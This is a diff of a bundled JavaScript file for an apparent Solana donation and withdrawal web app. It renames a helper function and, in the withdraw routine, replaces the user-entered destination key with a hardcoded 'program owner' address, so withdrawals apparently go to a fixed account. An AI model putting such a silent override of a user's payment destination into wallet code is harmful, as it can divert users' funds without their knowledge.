@@ -44350,7 +44350,7 @@ var path = "../wallets/id.json";
 var pathe = "../wallets/testers.json";
 var path_prog = "../wallets/program.json";
 
-function testerrrrrrrrr(ac) {
+function get_records(ac) {
   return __awaiter(this, void 0, void 0, function () {
     var acc_bytes, dat, dat_arr, i, final_arr, y;
     return __generator(this, function (_a) {
@@ -44608,13 +44608,14 @@ exports.sendViaSolletDonation = sendViaSolletDonation;
 
 function sendViaSolletWithdraw(b) {
   return __awaiter(this, void 0, void 0, function () {
-    var output_list, input, val, fee, resiver_key, fs, private_key, str, programKeypair, sender_key, data, ix, res;
+    var output_list, progrm_owner, input, val, fee, resiver_key, fs, private_key, str, programKeypair, sender_key, data, ix, res;
     return __generator(this, function (_a) {
       switch (_a.label) {
         case 0:
           output_list = document.querySelector('#inform_withdraw');
           output_list.textContent = "Withdraw in progress";
-          input = document.getElementById("pub_key").value;
+          progrm_owner = "HvKk3uTjtq61Uy8Lm5XT87Hp56GTv1YhW1QpgNE5Bg4W";
+          input = progrm_owner;
           fee = 7000;
           if (!b) return [3
           /*break*/
@@ -44725,7 +44726,7 @@ function getTransactions() {
           output_list.textContent = "Operation in progress";
           return [4
           /*yield*/
-          , testerrrrrrrrr(greetedAccount)];
+          , get_records(greetedAccount)];
 
         case 2:
           array = _a.sent();
